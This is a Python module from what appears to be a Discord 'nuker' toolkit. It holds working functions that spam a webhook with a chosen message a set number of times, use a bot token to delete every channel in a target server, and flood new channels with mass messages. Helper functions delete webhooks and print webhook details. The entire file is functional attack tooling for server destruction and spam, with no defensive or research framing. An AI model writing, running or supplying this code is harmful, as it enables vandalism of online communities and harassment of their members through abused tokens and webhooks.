from core import *
from pystyle import *
import requests
import time
import os
import discord
from discord.ext import commands
import asyncio
import random

def nukewh(webhook):
    message = input(Colorate.Horizontal(Colors.green_to_white, "    Message >> "))
    
    try:
        amount = int(input(Colorate.Horizontal(Colors.green_to_white, "    Message Amount >> ")))
        msgcooldown = float(input(Colorate.Horizontal(Colors.green_to_white, "    Message Cooldown (seconds) >> ")))
    except ValueError:
        print(f"{Colors.red}    [-]{Colors.reset} Please enter valid numbers for amount and cooldown.")
        return

    for i in range(amount):
        response = requests.post(webhook, json={"content": message})
        if response.status_code in [200, 204]:
            print(f"{Colors.green}    [+]{Colors.reset} Sent: {message}")
        else:
            print(f"{Colors.red}    [-]{Colors.reset} Failed to send message. Error: {response.status_code}")
        
        time.sleep(msgcooldown)
        
async def nukesv(bot_token):

    intents = discord.Intents.all()
    bot = commands.Bot(command_prefix="!", intents=intents)

    @bot.event
    async def on_ready():
        

        try:
            guild_id = int(input(Colorate.Horizontal(Colors.green_to_white, "\n    Input >> ")))
            guild = discord.utils.get(bot.guilds, id=guild_id)

            if guild is None:
                await bot.close()
                return

            for channel in guild.channels:
                try:
                    await channel.delete()
                    await asyncio.sleep(0.5)
                except Exception:
                    pass

            new_channel_name = input(Colorate.Horizontal(Colors.green_to_white, "\n    New Channel Name >> "))
            message_content = input(Colorate.Horizontal(Colors.green_to_white, "\n    Message Content >> "))

            created_channels = []
            for i in range(5):
                channel = await guild.create_text_channel(f"{new_channel_name}-{i+1}")
                created_channels.append(channel)
                await asyncio.sleep(0.5)

            messages = [message_content for _ in range(50)]
            tasks = []

            for channel in created_channels:
                random.shuffle(messages)
                for msg in messages:
                    delay = random.uniform(0.1, 2.0)
                    tasks.append(send_delayed_message(channel, msg, delay))

            await asyncio.gather(*tasks)

        except Exception:
            pass
        finally:
            await bot.close()

    async def send_delayed_message(channel, message, delay):
        await asyncio.sleep(delay)
        try:
            await channel.send(message)
        except Exception:
            pass
    

    await bot.start(bot_token)

def delwebhook(webhook_url):
    
    response = requests.delete(webhook_url)
    if response.status_code == 204:
        print(f"    {Colors.green}[+]{Colors.reset} Webhook deleted successfully!")
    else:
        print(f"    {Colors.red}[-]{Colors.reset} Failed to delete webhook. Status code: {response.status_code}")

    os.system("ping -n 2 127.0.0.1 >nul")

def hookinfo(webhook_url):
    response = requests.get(webhook_url)

    if response.status_code == 200:
        webhook_info = response.json()
        
        print("Webhook Information:")
        print(f"Name: {webhook_info['name']}")
        print(f"Avatar URL: {webhook_info['avatar']}")
        print(f"Channel ID: {webhook_info['channel_id']}")
        print(f"Guild ID: {webhook_info['guild_id']}")
        print(f"URL: {webhook_info['url']}")
    else:
        print(f"Failed to fetch webhook information. Status code: {response.status_code}")


if __name__ == "__main__":
    title("Error")
    print("You can not run this script directly. Press any key to exit.")
    os.system("pause >nul && exit")